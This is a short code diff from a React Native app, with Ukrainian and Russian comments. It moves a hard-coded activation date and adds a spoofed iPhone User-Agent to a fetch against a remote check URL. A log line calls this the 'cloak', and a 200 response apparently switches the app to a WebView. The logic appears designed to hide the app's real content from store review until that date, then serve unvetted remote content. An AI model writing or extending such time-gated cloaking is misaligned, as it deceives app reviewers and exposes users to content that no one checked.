@@ -570,7 +570,7 @@ const App = () => {
     const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
     //console.log('checkUrl==========+>', checkUrl);
   
-    const targetData = new Date('2025-07-01T08:08:00'); //дата з якої поч працювати webView
+    const targetData = new Date('2025-07-14T08:08:00'); //дата з якої поч працювати webView
     const currentData = new Date(); //текущая дата
   
     if (!route) {
@@ -578,7 +578,12 @@ const App = () => {
       if (currentData <= targetData) {
         setRoute(false);
       } else {
-        fetch(checkUrl)
+        fetch(checkUrl, {
+          method: 'GET',
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
+          },
+        })
           .then(r => {
             console.log('status по клоаке=++++++++++++=>', r.status);
             if (r.status === 200) {
